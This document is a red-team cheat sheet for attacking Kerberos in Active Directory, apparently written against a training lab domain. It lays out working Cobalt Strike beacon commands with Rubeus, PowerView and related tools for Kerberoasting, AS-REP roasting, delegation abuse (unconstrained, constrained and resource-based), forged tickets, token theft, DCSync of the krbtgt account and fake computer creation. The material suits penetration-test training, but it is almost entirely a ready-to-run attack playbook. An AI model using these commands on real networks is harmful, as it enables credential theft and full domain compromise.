# Kerberos

## 1) Kerberoasting

    beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap

    ps> hashcat -a 0 -m 13100 hashes wordlist

## 2) ASREPRoast

    beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:squid_svc /nowrap

    ps> hashcat -a 0 -m 18200 svc_oracle wordlist

## 3) Unconstrained Delegation (Caches TGT of any user accessing its service)

1. Identify the computer objects having Unconstrained Delegation enabled

        beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname

2. Dumping the cached TGT ticket (requires system access on affected system)

        beacon> getuid
        beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
        beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x14794e /nowrap
        beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:10 /nowrap

3. Execute PrintSpool attack to force DC to authenticate with WEB 

        beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe dc-2.dev.cyberbotic.io web.dev.cyberbotic.io

4. Use Machine TGT (DC) fetched to gain RCE on itself using S4U abuse (/self flag)

        beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/dc-2.dev.cyberbotic.io /user:dc-2$ /ticket:doIFuj[...]lDLklP /nowrap

5. Inject the ticket and access the service

        beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[...]MuaW8=

        beacon> steal_token 2664
        beacon> ls \\dc-2.dev.cyberbotic.io\c$

## 4) Constrained Delegation (allows to request TGS for any user using its TGT)

1. Identify the computer objects having Constrained Delegation is enabled

        beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json

2. Dump the TGT of User/Computer Account having constrained Delegation enabled (use asktgt if NTLM hash)

        beacon> getuid
        beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
        beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

3. Use S4U technique to request TGS for delegated service using machines TGT (Use S4U2Proxy tkt)

        beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /user:sql-2$ /ticket:doIFLD[...snip...]MuSU8= /nowrap

4. OR, Access other alternate Service not stated in Delegation attribute (ldap)

        beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /altservice:ldap /user:sql-2$ /ticket:doIFpD[...]MuSU8= /nowrap

5. Inject the S4U2Proxy tkt from previous step

        beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGaD[...]ljLmlv

6. Access the services 

        beacon> steal_token 5540
        beacon> ls \\dc-2.dev.cyberbotic.io\c$
        beacon> dcsync dev.cyberbotic.io DEV\krbtgt

## 5) Resource-Based Constrained Delegation (Systems having writable msDS-AllowedToActOnBehalfOfOtherIdentity)

1. Identify the Computer Objects which has AllowedToActOnBehalfOfOtherIdentity attribute defined

        beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))" --attributes dnshostname,samaccountname,msDS-AllowedToActOnBehalfOfOtherIdentity --json

2. OR, Identify the Domain Computer where we can write this atribute with custom value 

        beacon> powerpick Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }

        beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107

3. Next we will assign delegation rights to our computer by modifying the attribute of target system

        beacon> powerpick Get-DomainComputer -Identity wkstn-2 -Properties objectSid
        beacon> powerpick $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)"; $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0); Get-DomainComputer -Identity "dc-2" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose

4. Verify the updated attribute

        beacon> powerpick Get-DomainComputer -Identity "dc-2" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity

5. Get the TGT of our computer

        beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
        beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

6. Use S4U technique to get TGS for target computer using our TGT

        beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:WKSTN-2$ /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /ticket:doIFuD[...]5JTw== /nowrap

7. Access the services

        beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGcD[...]MuaW8=

        beacon> steal_token 4092
       beacon> ls \\dc-2.dev.cyberbotic.io\c$

8 Remove the delegation rights

    beacon> powerpick Get-DomainComputer -Identity dc-2 | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity

OR, Create Fake computer Account for RBCD Attack

9. Check if we have permission to create computer account (default allowed)

        beacon> powerpick Get-DomainObject -Identity "DC=dev,DC=cyberbotic,DC=io" -Properties ms-DS-MachineAccountQuota

10. Create a fake computer with random password (generate hash using Rubeus)

        beacon> execute-assembly C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.exe --computer EvilComputer --make
        PS> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /password:<password> /user:EvilComputer$ /domain:dev.cyberbotic.io

11. Use the Hash to get TGT for our fake computer, and rest of the steps remains same

        beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:EvilComputer$ /aes256:<aes256> /nowrap
